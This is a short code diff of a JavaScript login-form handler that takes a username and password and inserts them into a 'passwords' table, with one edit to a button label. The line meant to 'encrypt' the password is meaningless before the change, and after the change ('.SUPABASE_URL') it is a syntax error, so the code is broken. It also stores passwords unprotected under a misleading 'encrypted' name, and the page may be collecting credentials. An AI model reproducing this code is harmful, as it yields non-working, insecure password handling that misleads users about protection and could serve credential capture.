@@ -176,7 +176,7 @@
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
 
-            const encrypted = pass.SUPABASE_URL
+            const encrypted = .SUPABASE_URL
             
             const { error } = await supabaseClient.from('passwords').insert([
                 { username: user, password: encrypted }
@@ -194,7 +194,7 @@
             
             // Simulating a delay
             setTimeout(() => {
-                btn.innerHTML = "Sign In";
+                btn.innerHTML = "Log In";
                 btn.style.opacity = "1";
             }, 1500);
         });
